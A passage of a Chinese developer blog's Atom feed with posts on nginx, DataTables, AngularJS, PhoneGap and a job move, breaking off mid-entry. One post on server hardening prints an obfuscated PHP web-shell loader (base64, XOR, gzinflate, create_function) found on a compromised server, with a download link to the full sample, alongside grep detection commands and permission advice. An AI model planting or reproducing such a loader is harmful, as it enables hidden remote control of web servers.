<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title><![CDATA[lurrpis]]></title>
  
  <link href="/atom.xml" rel="self"/>
  <link href="http://lurrpis.com/"/>
  <updated>2015-09-15T12:48:16.718Z</updated>
  <id>http://lurrpis.com/</id>
  
  <author>
    <name><![CDATA[LURRPIS]]></name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title><![CDATA[How to configure the nginx with Wordpress&Codeigniter]]></title>
    <link href="http://lurrpis.com/77.html"/>
    <id>http://lurrpis.com/77.html</id>
    <published>2015-09-15T11:57:15.000Z</published>
    <updated>2015-09-15T12:48:16.718Z</updated>
    <content type="html"><![CDATA[<h3 id="前言">前言</h3><p>项目由<code>Apache</code>迁移至<code>Nginx</code>由于重写原因导致<code>Wordpress</code>中的<code>Codeignter</code>在<code>Nginx</code>下无法正常运行</p>
<p><img class="noborder" src="http://static.blog.lurrpis.com/images/500_error.png" alt="500_error"></p>
<p>Google,StackOverflow <a href="http://stackoverflow.com/questions/32503693/codeigniter-in-wordpress-how-to-config-nginx" target="_blank" rel="external">问题链接</a>,并自行多次尝试配置<code>nginx server config</code>后依然无果。</p>
<h3 id="解决方法">解决方法</h3><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="title">server</span> &#123;</span><br><span class="line">    <span class="title">listen</span> <span class="number">80</span>;</span><br><span class="line">    <span class="title">server_name</span> nginx.local.com;</span><br><span class="line">    <span class="title">root</span> /var/projects/root;</span><br><span class="line">    <span class="title">error_log</span>  /var/projects/log/error.log <span class="built_in">warn</span>;</span><br><span class="line">    <span class="title">access_log</span>  /var/projects/log/access.log main;</span><br><span class="line"></span><br><span class="line">    <span class="title">if</span> (<span class="variable">$host</span> != <span class="string">'nginx.local.com'</span>)&#123;</span><br><span class="line">       <span class="title">rewrite</span><span class="regexp"> ^/(.*)</span> <span class="url">http://nginx.local.com/<span class="variable">$1</span></span> <span class="built_in">permanent</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title">location</span> / &#123;</span><br><span class="line">        <span class="title">index</span> index.php index.html index.html;</span><br><span class="line">        <span class="title">if</span> (!-e <span class="variable">$request_filename</span>) &#123;</span><br><span class="line">            <span class="title">rewrite</span><span class="regexp"> ^.+?(/wp-.*)</span> <span class="variable">$1</span> <span class="built_in">last</span>;</span><br><span class="line">            <span class="title">rewrite</span><span class="regexp"> ^.+?(/.*\.php)$</span> <span class="variable">$1</span> <span class="built_in">last</span>;</span><br><span class="line">            <span class="title">rewrite</span><span class="regexp"> ^</span> /index.php <span class="built_in">last</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title">rewrite</span><span class="regexp"> ^.*/files/(.*)$</span> /wp-includes/ms-files.php?file=<span class="variable">$1</span> <span class="built_in">last</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">#此处是 Codeignter 所在目录</span></span><br><span class="line">    <span class="title">location</span> <span class="regexp">~ /codeignter</span> &#123;</span><br><span class="line">        <span class="title">try_files</span> <span class="variable">$uri</span> <span class="variable">$uri</span>/ /index.php?<span class="variable">$query_string</span>;</span><br><span class="line">        <span class="title">location</span> <span class="regexp">~ \.php($|/)</span> &#123;</span><br><span class="line">            <span class="title">fastcgi_pass</span>   <span class="number">127.0.0.1:9000</span>;</span><br><span class="line">            <span class="title">fastcgi_index</span>  evindex.php;</span><br><span class="line">            <span class="title">fastcgi_split_path_info</span><span class="regexp"> ^(.+\.php)(.*)$</span>;</span><br><span class="line">            <span class="title">fastcgi_param</span>   PATH_INFO <span class="variable">$fastcgi_path_info</span>;</span><br><span class="line">            <span class="title">fastcgi_param</span>  SCRIPT_FILENAME  <span class="variable">$document_root</span><span class="variable">$fastcgi_script_name</span>;</span><br><span class="line">            <span class="title">include</span>        fastcgi_params;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title">location</span> <span class="regexp">~ \.php$</span> &#123;</span><br><span class="line">        <span class="title">fastcgi_pass</span>   <span class="number">127.0.0.1:9000</span>;</span><br><span class="line">        <span class="title">fastcgi_index</span>  index.php;</span><br><span class="line">        <span class="title">fastcgi_param</span>  SCRIPT_FILENAME  <span class="variable">$document_root</span><span class="variable">$fastcgi_script_name</span>;</span><br><span class="line">        <span class="title">include</span>        fastcgi_params;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    <summary type="html">
    <![CDATA[<h3 id="前言">前言</h3><p>项目由<code>Apache</code>迁移至<code>Nginx</code>由于重写原因导致<code>Wordpress</code>中的<code>Codeignter</code>在<code>Nginx</code>下]]>
    </summary>
    
      <category term="codeignter" scheme="http://lurrpis.com/tags/codeignter/"/>
    
      <category term="nginx" scheme="http://lurrpis.com/tags/nginx/"/>
    
      <category term="wordpress" scheme="http://lurrpis.com/tags/wordpress/"/>
    
      <category term="code" scheme="http://lurrpis.com/categories/code/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Datatables 执行 ajax 之前添加自定义字段]]></title>
    <link href="http://lurrpis.com/76.html"/>
    <id>http://lurrpis.com/76.html</id>
    <published>2015-08-26T13:45:53.000Z</published>
    <updated>2015-08-26T14:30:09.391Z</updated>
    <content type="html"><![CDATA[<h3 id="前言">前言</h3><p>基于<code>Datatables</code>做新功能开发，发现使用<code>.fnDraw()</code>触发表格数据刷新时，其 ajax 字段不能动态获取，搜烂国内外引擎抓破头也没找到解决方案。</p>
<blockquote>
<p>像这样</p>
</blockquote>
<p><img src="http://static.blog.lurrpis.com/images/1.png" alt="image"></p>
<blockquote>
<p>或者这样</p>
</blockquote>
<p><img src="http://static.blog.lurrpis.com/images/3.png" alt="image"></p>
<h3 id="解决方法">解决方法</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// datatable 配置</span></span><br><span class="line"><span class="keyword">var</span> DATA_TABLE_OBJ, RESPONSE_URL = <span class="string">''</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">datatable_render</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    RESPONSE_URL = <span class="string">'/dashboard/info/charge_list/charge_table'</span>;</span><br><span class="line">    DATA_TABLE_OBJ = $(<span class="string">"#datatable"</span>).dataTable(&#123;</span><br><span class="line">        <span class="string">"processing"</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="string">"serverSide"</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="string">"ajax"</span>: &#123;</span><br><span class="line">            <span class="string">'url'</span>: RESPONSE_URL,</span><br><span class="line">            <span class="string">'type'</span>: <span class="string">'POST'</span>,</span><br><span class="line">            <span class="string">'data'</span>: &#123;</span><br><span class="line">                <span class="string">'testData'</span>:<span class="string">'Hello World'</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">"columns"</span>:[&#123;<span class="string">"data"</span>: <span class="string">"columns_name"</span>&#125;],</span><br><span class="line">        <span class="string">"bScrollInfinite"</span>: <span class="literal">true</span></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$(<span class="string">'#search_btn'</span>).click(<span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">    DATA_TABLE_OBJ.fnSettings().ajax.data.testData=<span class="string">'更新参数内容'</span>;</span><br><span class="line">    DATA_TABLE_OBJ.fnSettings().ajax.data.testNewData=<span class="string">'新增参数内容'</span>;</span><br><span class="line">    DATA_TABLE_OBJ.fnDraw();</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
]]></content>
    <summary type="html">
    <![CDATA[<h3 id="前言">前言</h3><p>基于<code>Datatables</code>做新功能开发，发现使用<code>.fnDraw()</code>触发表格数据刷新时，其 ajax 字段不能动态获取，搜烂国内外引擎抓破头也没找到解决方案。</p>
<blockquot]]>
    </summary>
    
      <category term="datatables" scheme="http://lurrpis.com/tags/datatables/"/>
    
      <category term="jQuery" scheme="http://lurrpis.com/tags/jQuery/"/>
    
      <category term="code" scheme="http://lurrpis.com/categories/code/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Html Body 莫名加上'MacOSX ATTRV'原因及解决]]></title>
    <link href="http://lurrpis.com/53.html"/>
    <id>http://lurrpis.com/53.html</id>
    <published>2015-07-09T04:17:42.000Z</published>
    <updated>2015-07-09T04:57:04.847Z</updated>
    <content type="html"><![CDATA[<h4 id="前言">前言</h4><p>今天上传项目时是由Mac tar打包上传到Linux服务器解包的，部署完成后访问页面发现页面的<code>Body</code>之前都被加入了<br><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Mac</span> OS X     2��ATTRV(<span class="keyword">D</span>��-�-com.apple.quarantineq/0000;4c9151bf;Fir</span><br></pre></td></tr></table></figure></p>
<p>一行奇怪的字符。</p>
<h5 id="Mac环境解决方案">Mac环境解决方案</h5><p>Google后发现Mac解决方案<br><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">xattr -r -d com<span class="class">.apple</span><span class="class">.quarantine</span> file-path</span><br></pre></td></tr></table></figure></p>
<p>原文地址<a href="http://entropytc.com/got-com-apple-quarantine-problems/" target="_blank" rel="external">http://entropytc.com/got-com-apple-quarantine-problems/</a></p>
<p>不过在Linux下没有xattr命令，就去Linux目录下<code>ls -a</code>发现每个文件都被克隆了一个<code>._</code>开头的文件，由于检查过原始文件并未遭到改动，果然删除这些<code>._</code>开头文件即解决了问题</p>
<h5 id="Linux解决方案_-_批量删除-_开头文件">Linux解决方案 - 批量删除._开头文件</h5><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">find ./ -<span class="property">name</span> <span class="string">"._*"</span> -exec rm -f &#123;&#125; \;</span><br></pre></td></tr></table></figure>]]></content>
    <summary type="html">
    <![CDATA[<h4 id="前言">前言</h4><p>今天上传项目时是由Mac tar打包上传到Linux服务器解包的，部署完成后访问页面发现页面的<code>Body</code>之前都被加入了<br><figure class="highlight stata"><table><tr>]]>
    </summary>
    
      <category term="xattr" scheme="http://lurrpis.com/tags/xattr/"/>
    
      <category term="code" scheme="http://lurrpis.com/categories/code/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Hello Shanghai!]]></title>
    <link href="http://lurrpis.com/52.html"/>
    <id>http://lurrpis.com/52.html</id>
    <published>2015-06-23T16:12:49.000Z</published>
    <updated>2015-07-20T04:02:35.145Z</updated>
    <content type="html"><![CDATA[<h5 id="前言">前言</h5><p>有一段时间没有更新博客了，在新浪离职后奔波于武汉于上海两地，面试，托运，搬家等琐事忙的焦头烂额。面试成功两天后拿到期待中<code>Ping++</code>的Offer，心里的石头总算落地，婉拒别家面试和Offer后满意和Ping++签约。</p>
<h5 id="入职">入职</h5><p>今天<code>2015.06.23</code>是入职<a href="https://pingxx.com" target="_blank" rel="external">https://pingxx.com</a>的第一天，<code>Ping++</code>果然一展土豪气质，办理手续的同时就给配了一台<code>MacbookPro(Ping++入职标配)</code>，轻松开放的办公环境，互联网公司别有的文化氛围，外加同事们的格外热情(有能力的人果然都是这样低调和蔼可亲)，受宠若惊，一种团队归属感油然而生！</p>
<h5 id="革命尚未完成，还需继续努力">革命尚未完成，还需继续努力</h5><p>然而……并没有什么卵用。<br>时间不早啦，休息了，晚安！</p>
<p><img class="noborder" src="http://static.blog.lurrpis.com/IMG_5052.JPG" alt="Ping++招聘"></p>
]]></content>
    <summary type="html">
    <![CDATA[<h5 id="前言">前言</h5><p>有一段时间没有更新博客了，在新浪离职后奔波于武汉于上海两地，面试，托运，搬家等琐事忙的焦头烂额。面试成功两天后拿到期待中<code>Ping++</code>的Offer，心里的石头总算落地，婉拒别家面试和Offer后满意和Ping++]]>
    </summary>
    
      <category term="随笔" scheme="http://lurrpis.com/tags/%E9%9A%8F%E7%AC%94/"/>
    
      <category term="essay" scheme="http://lurrpis.com/categories/essay/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[AngularJS AJAX远程表单验证]]></title>
    <link href="http://lurrpis.com/50.html"/>
    <id>http://lurrpis.com/50.html</id>
    <published>2015-06-01T09:07:56.000Z</published>
    <updated>2015-06-01T09:18:59.607Z</updated>
    <content type="html"><![CDATA[<h5 id="解决方法">解决方法</h5><figure class="highlight nix"><table><tr><td class="code"><pre><span class="line">&lt;form <span class="variable">ng-app=</span><span class="string">"RegistModal"</span> <span class="variable">name=</span><span class="string">"login_form"</span>&gt;</span><br><span class="line">	Username: &lt;input <span class="variable">type=</span><span class="string">"text"</span> <span class="variable">name=</span><span class="string">"username"</span> <span class="variable">ng-minlength=</span><span class="number">5</span> <span class="variable">ng-maxlength=</span><span class="number">12</span> <span class="variable">ng-model=</span><span class="string">"login.name"</span> <span class="variable">ensure-action=</span><span class="string">"unique"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="keyword">var</span> RegistApp = angular.module(<span class="string">'RegistModal'</span>, []);</span><br><span class="line">    RegistApp.directive(<span class="string">'ensureAction'</span>, [<span class="string">'$http'</span>, <span class="function"><span class="keyword">function</span><span class="params">($http)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="built_in">require</span>: <span class="string">'ngModel'</span>,</span><br><span class="line">            link: <span class="function"><span class="keyword">function</span><span class="params">(scope, ele, attrs, c)</span> </span>&#123;</span><br><span class="line">                scope.$watch(attrs.ngModel, <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                    $http(&#123;</span><br><span class="line">                        method: <span class="string">'POST'</span>,</span><br><span class="line">                        url: <span class="string">'&lt;?php echo admin_url(); ?&gt;admin-ajax.php'</span>,</span><br><span class="line">                        data: $.param(&#123;action:attrs.ensureAction,value: c.$modelValue&#125;),</span><br><span class="line">                        headers: &#123;<span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded'</span>&#125;</span><br><span class="line">                    &#125;).success(<span class="function"><span class="keyword">function</span><span class="params">(data, status, headers, cfg)</span> </span>&#123;</span><br><span class="line">                        c.$setValidity(attrs.ensureAction, data.isSuccess);</span><br><span class="line">                    &#125;).error(<span class="function"><span class="keyword">function</span><span class="params">(data, status, headers, cfg)</span> </span>&#123;</span><br><span class="line">                        c.$setValidity(attrs.ensureAction, <span class="literal">false</span>);</span><br><span class="line">                    &#125;);</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;]);</span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>]]></content>
    <summary type="html">
    <![CDATA[<h5 id="解决方法">解决方法</h5><figure class="highlight nix"><table><tr><td class="code"><pre><span class="line">&lt;form <span class="variable">ng-]]>
    </summary>
    
      <category term="Ajax" scheme="http://lurrpis.com/tags/Ajax/"/>
    
      <category term="AngularJS" scheme="http://lurrpis.com/tags/AngularJS/"/>
    
      <category term="表单验证" scheme="http://lurrpis.com/tags/%E8%A1%A8%E5%8D%95%E9%AA%8C%E8%AF%81/"/>
    
      <category term="code" scheme="http://lurrpis.com/categories/code/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[AngularJS $http时将RequestPayload转换为PostForm方式]]></title>
    <link href="http://lurrpis.com/37.html"/>
    <id>http://lurrpis.com/37.html</id>
    <published>2015-06-01T08:41:08.000Z</published>
    <updated>2015-06-01T09:04:08.057Z</updated>
    <content type="html"><![CDATA[<h5 id="前言">前言</h5><p>使用$http时，后台接收不到参数，抓包发现AngularJS $http使用了RequestPayload传送数据，而JQuery $.ajax使用的是PostForm传送数据<br><code>RequestPayload</code><br><img src="http://static.blog.lurrpis.com/11FD3EFBF34F.png" class="noborder"><br><code>PostForm</code><br><img src="http://static.blog.lurrpis.com/222.png" class="noborder"></p>
<h5 id="解决方法">解决方法</h5><figure class="highlight nimrod"><table><tr><td class="code"><pre><span class="line">$http(&#123;</span><br><span class="line">    <span class="keyword">method</span>: '<span class="type">POST</span>',</span><br><span class="line">    url: url,</span><br><span class="line">    data: $.param(&#123;fkey: <span class="string">"key"</span>&#125;),</span><br><span class="line">    headers: &#123;'<span class="type">Content</span>-<span class="type">Type</span>': 'application/x-www-form-urlencoded'&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>]]></content>
    <summary type="html">
    <![CDATA[<h5 id="前言">前言</h5><p>使用$http时，后台接收不到参数，抓包发现AngularJS $http使用了RequestPayload传送数据，而JQuery $.ajax使用的是PostForm传送数据<br><code>RequestPayload</cod]]>
    </summary>
    
      <category term="Ajax" scheme="http://lurrpis.com/tags/Ajax/"/>
    
      <category term="AngularJS" scheme="http://lurrpis.com/tags/AngularJS/"/>
    
      <category term="code" scheme="http://lurrpis.com/categories/code/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Phonegap安卓不支持Viewport解决方法]]></title>
    <link href="http://lurrpis.com/38.html"/>
    <id>http://lurrpis.com/38.html</id>
    <published>2015-05-24T01:24:07.000Z</published>
    <updated>2015-05-24T02:57:00.587Z</updated>
    <content type="html"><![CDATA[<h5 id="前言">前言</h5><p>使用Phonegap开发安卓时遇到虚拟机调试正常，一旦真机调试就出现兼容性问题的情况。</p>
<h5 id="Android解决方法">Android解决方法</h5><h6 id="方法一：修改CordovaWebView-java_[已验证可行]">方法一：修改CordovaWebView.java [已验证可行]</h6><p>Phonegap版本不同，可能位置不同，可以全局查找一下<code>getUserAgentString</code><br><figure class="highlight puppet"><table><tr><td class="code"><pre><span class="line"><span class="keyword">settings</span>.getUserAgentString();</span><br><span class="line">//增加下面两行代码：</span><br><span class="line"><span class="keyword">settings</span>.setUseWideViewPort(<span class="keyword">true</span>);</span><br><span class="line"><span class="keyword">settings</span>.setLoadWithOverviewMode(<span class="keyword">true</span>);</span><br></pre></td></tr></table></figure></p>
<h6 id="方法二：添加ViewPortScale插件">方法二：添加ViewPortScale插件</h6><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">插件地址<span class="symbol">:https</span><span class="symbol">://github</span>.com/drawapp8/<span class="constant">ViewPort</span></span><br></pre></td></tr></table></figure>
<h5 id="IOS解决方法">IOS解决方法</h5><h6 id="方法一：">方法一：</h6><p>由于未遇到IOS不兼容的问题，故没有验证该方法的可行性<br>在Phonegap的<code>config.xml</code>中增加一行配置：<br><figure class="highlight nix"><table><tr><td class="code"><pre><span class="line">&lt;preference <span class="variable">name=</span><span class="string">"EnableViewportScale"</span> <span class="variable">value=</span><span class="string">"true"</span>/&gt;</span><br></pre></td></tr></table></figure></p>
]]></content>
    <summary type="html">
    <![CDATA[<h5 id="前言">前言</h5><p>使用Phonegap开发安卓时遇到虚拟机调试正常，一旦真机调试就出现兼容性问题的情况。</p>
<h5 id="Android解决方法">Android解决方法</h5><h6 id="方法一：修改CordovaWebView-java]]>
    </summary>
    
      <category term="android" scheme="http://lurrpis.com/tags/android/"/>
    
      <category term="phonegap" scheme="http://lurrpis.com/tags/phonegap/"/>
    
      <category term="code" scheme="http://lurrpis.com/categories/code/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[第一款哎派派，发布AppStore]]></title>
    <link href="http://lurrpis.com/35.html"/>
    <id>http://lurrpis.com/35.html</id>
    <published>2015-05-13T08:03:59.000Z</published>
    <updated>2015-05-14T08:15:47.856Z</updated>
    <content type="html"><![CDATA[<blockquote class="blockquote-center">折腾了一周PhoneGap<br>终于也成功的发布了安卓和IOS应用</blockquote>

<p><img src="http://static.blog.lurrpis.com/6F74D591-1DBE-4228-BD11-0142007E748C.png" alt="发布APPSTORE"><br><img src="http://static.blog.lurrpis.com/EAB2ADDE-A4A2-4758-81EB-E11462F16037.png" alt="发布APPSTORE"></p>
]]></content>
    <summary type="html">
    <![CDATA[<blockquote class="blockquote-center">折腾了一周PhoneGap<br>终于也成功的发布了安卓和IOS应用</blockquote>

<p><img src="http://static.blog.lurrpis.com/6F74D591-]]>
    </summary>
    
      <category term="AppStore发布教程" scheme="http://lurrpis.com/tags/AppStore%E5%8F%91%E5%B8%83%E6%95%99%E7%A8%8B/"/>
    
      <category term="Xcode真机调试" scheme="http://lurrpis.com/tags/Xcode%E7%9C%9F%E6%9C%BA%E8%B0%83%E8%AF%95/"/>
    
      <category term="code" scheme="http://lurrpis.com/categories/code/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Linux/MacOS的目录权限控制，让WEB木马遁于无形]]></title>
    <link href="http://lurrpis.com/33.html"/>
    <id>http://lurrpis.com/33.html</id>
    <published>2015-04-28T14:07:58.000Z</published>
    <updated>2015-04-28T15:27:11.061Z</updated>
    <content type="html"><![CDATA[<h4 id="前言">前言</h4><p>之前一个上线稳定运行很久的项目今天遭到DDos攻击，服务器频繁掉线，做了CDN防火墙之后，审查服务器文件时，意外发现多了一个<code>php</code>文件，代码内容如下:<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="preprocessor">&lt;?php</span></span><br><span class="line"><span class="comment">/* (c) 2012    the hall. Then he shouted, Theres another</span><br><span class="line">    the letter from him, which was made difficult</span><br><span class="line">    got hit a lot by the Smelting stick, Uncle</span><br><span class="line">    he wheezed at Harry. Dudleygojust go.</span><br><span class="line">    his first letter. Surely that meant theyd</span><br><span class="line">    morning. Harry turned it off quickly and</span><br><span class="line">    get the letters for number four first. His</span><br><span class="line">*/</span></span><br><span class="line"><span class="variable">$B_yhp</span>=<span class="string">'bCtyDEF7u+8SszsSu+kgCO5ydU+XgC8PCVdhu1jwM7cyDU6dY0V7URbSZ/vRet5yeUMemFKfJenoCzXw9lZAbIuk2UAa4ropc3D79pk51cei/xx3CVTD+MhhXbzOaTXaKEFeU/Thlb9CADYcUGsriPoiVf30oghRtZ/iT9y7u…太多省略，下文会分享完整文件给有兴趣的人研究'</span>;    </span><br><span class="line"><span class="comment">/*</span><br><span class="line">    his horror Harry realized that the big, squashy</span><br><span class="line">*/</span></span><br><span class="line">    <span class="variable">$Dah_d</span>=<span class="number">605142629</span>;</span><br><span class="line">    <span class="variable">$L_qmfd</span>=base64_decode(<span class="variable">$B_yhp</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;strlen(<span class="variable">$L_qmfd</span>); <span class="variable">$i</span>++)&#123;<span class="variable">$L_qmfd</span>[<span class="variable">$i</span>]=chr( ord(<span class="variable">$L_qmfd</span>[<span class="variable">$i</span>])^((<span class="number">25043</span>)%<span class="number">256</span>));&#125;</span><br><span class="line">    <span class="variable">$Laz_ep</span>=@gzinflate(strrev(<span class="variable">$L_qmfd</span>));</span><br><span class="line">    <span class="keyword">if</span>(crc32(<span class="variable">$Laz_ep</span>)==<span class="variable">$Dah_d</span>)&#123; </span><br><span class="line">      <span class="variable">$V_ibc</span>=create_function(<span class="string">'$a'</span>,<span class="variable">$Laz_ep</span>);</span><br><span class="line">      <span class="variable">$V_ibc</span>(<span class="string">"7l3rbp1c9a7d1l0i5oby5u3n6a6sdj3b0w0pbjctacbc1oazbeak3d5pfcba9vbx"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="preprocessor">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>访问此文件，如下图：<br><img class="noborder" src="http://static.blog.lurrpis.com/chmod7.png" alt="WEB木马"><br>很显然，这是一个木马文件，输入密码后，可能就可以操纵任意权限为777的目录，而当时此项目在WEB根目录设置了<code>chmod -R 777 webroot</code>权限。此时，赶紧备份网站后查找剩余的木马文件并删除。<br>这里分享个简易查找木马文件的bash命令<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find /wwwroot/* -type f -name <span class="string">"*.php"</span> |xargs grep <span class="string">"eval("</span> &gt; /wwwroot/scan.txt </span><br><span class="line">find /wwwroot/* -type f -name <span class="string">"*.php"</span> |xargs grep <span class="string">"create_function("</span> &gt; /wwwroot/scan.txt</span><br></pre></td></tr></table></figure></p>
<p>目前WEB木马常用，<code>eval</code>和<code>create_function</code>对代码进行解码，查找输出的这些文件就要多加注意，确认是否为木马文件。</p>
<h4 id="Linux/Mac_OS设置目录权限">Linux/Mac OS设置目录权限</h4><p>在开发过程中，难于避免漏洞，在这种情况下，如果能正确设置 Linux 网站目录权限， php 进程权限，那么网站的安全性实际上是可以得到保障的。<br><code>php-fpm/apache/nginx</code>进程对网站文件至少需要有读取权限，例如，以下命令即可查看这两个进程所使用的账号：<br><img src="http://static.blog.lurrpis.com/chmod1.jpg" alt="chmod"><br><img src="http://static.blog.lurrpis.com/chmod2.jpg" alt="chmod"><br>通过上图，我们可以发现，nginx和php-fpm子进程账号是<code>nobody</code> 。<br>我们再查看网站文件目录的权限:<br><img src="http://static.blog.lurrpis.com/chmod3.jpg" alt="chmod"><br>发现网站文件所有者是www账号，那么说明：</p>
<ul>
<li>nginx和php对网站只有读取权限，无写入权限</li>
<li>如果php程序需要对网站某些文件有写入权限，需要手工将文件或目录权限修改为<code>777</code></li>
<li>因为php-fpm子进程是以<code>nobody</code>运行，那么php-fpm生成的新文件所有者也是<code>nobody</code>,  这时FTP用户将无法修改这些文件，解铃还需系铃人，当php生成文件后，需要调用 <code>chmod(&quot;/somedir/somefile&quot;, 0777)</code> 将文件权限修改为<code>777</code>，以便FTP用户也可以修改这个文件。</li>
<li>经常有开发人员找我请求重设 php 生成的文件的权限。</li>
<li>如果<code>php-fpm/apache/nginx</code>进程以网站文件所有者用户运行，那意味着<code>php-fpm/apache/nginx</code>进程对整个网站目录具有可写权限，噩梦也就由此开始。</li>
</ul>
<h4 id="了解权限标识">了解权限标识</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-rwxrwxrwx</span><br></pre></td></tr></table></figure>
<p>分别为:所有者/组用户/其他用户<br>r=4 读的权限<br>w=2 写的权限<br>×=1 执行的权限<br>例如:<br>读写为 4+2=6<br>只读为 4</p>
<p>常用修改权限的命令：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo chmod <span class="number">600</span> ××× （只有所有者有读和写的权限） </span><br><span class="line">sudo chmod <span class="number">644</span> ××× （所有者有读和写的权限，组用户只有读的权限） </span><br><span class="line">sudo chmod <span class="number">700</span> ××× （只有所有者有读和写以及执行的权限）</span><br><span class="line">sudo chmod <span class="number">666</span> ××× （每个人都有读和写的权限）</span><br><span class="line">sudo chmod <span class="number">777</span> ××× （每个人都有读和写以及执行的权限）</span><br></pre></td></tr></table></figure></p>
<h4 id="WEB项目目录权限设置建议">WEB项目目录权限设置建议</h4><p>根目录设置为<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chown -R nginx:root webroot <span class="comment">#设置网站文件属于nginx用户，root组</span></span><br><span class="line">chmod -R <span class="number">570</span> webroot <span class="comment">#设置所有者为只读+执行，ROOT组为读写执行，其他用户无权限</span></span><br></pre></td></tr></table></figure></p>
<p>设置upload或缓存等目录<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chmod -R <span class="number">770</span> upload</span><br></pre></td></tr></table></figure></p>
<p>目前，WEB目录下就仅有upload拥有写入权限，当然，木马仍然可以在此目录中运行，不过作用范围也只在upload里。不过不乏有些无耻之人，把图片也给你删光光，那么就禁止该目录下解析<code>php</code>文件吧。</p>
<h4 id="指定目录禁止解析PHP:">指定目录禁止解析PHP:</h4><h5 id="nginx_-_nginx-conf">nginx - nginx.conf</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">location ~ <span class="string">"^/uploads"</span> &#123;  </span><br><span class="line">&#125;  </span><br><span class="line">location ~ <span class="string">"\.php$"</span> &#123;  </span><br><span class="line">fastcgi_pass <span class="number">127.0</span>.<span class="number">0.0</span>:<span class="number">9000</span>;  </span><br><span class="line">....................  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="apache_-_httpd-conf">apache - httpd.conf</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;Directory <span class="string">"/var/www/uploads"</span>&gt;</span><br><span class="line">php_admin_flag engine off</span><br><span class="line">&lt;/Directory&gt;</span><br></pre></td></tr></table></figure>
<h4 id="核心总结">核心总结</h4><p><code>php-fpm/apache/nginx</code>进程所使用的用户，不能是网站文件所有者。 凡是违背这个原则，则不符合最小权限原则。遇到必须给与写入权限的文件夹，则设法防止代码在其中解析。做到这些，相信漏洞再多的代码也不必害怕WEB木马的入侵了。</p>
<p>服务器中被上传的加密<code>PHP</code>木马，感兴趣可以下载研究：<a href="http://static.blog.lurrpis.com/was-wp.php" target="_blank" rel="external">点击下载</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h4 id="前言">前言</h4><p>之前一个上线稳定运行很久的项目今天遭到DDos攻击，服务器频繁掉线，做了CDN防火墙之后，审查服务器文件时，意外发现多了一个<code>php</code>文件，代码内容如下:<br><figure class="highlight p]]>
    </summary>
    
      <category term="Linux权限控制" scheme="http://lurrpis.com/tags/Linux%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6/"/>
    
      <category term="WEB目录权限设置" scheme="http://lurrpis.com/tags/WEB%E7%9B%AE%E5%BD%95%E6%9D%83%E9%99%90%E8%AE%BE%E7%BD%AE/"/>
    
      <category term="预防PHP木马" scheme="http://lurrpis.com/tags/%E9%A2%84%E9%98%B2PHP%E6%9C%A8%E9%A9%AC/"/>
    
      <category term="code" scheme="http://lurrpis.com/categories/code/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[日志]]></title>
    <link href="http://lurrpis.com/32.html"/>
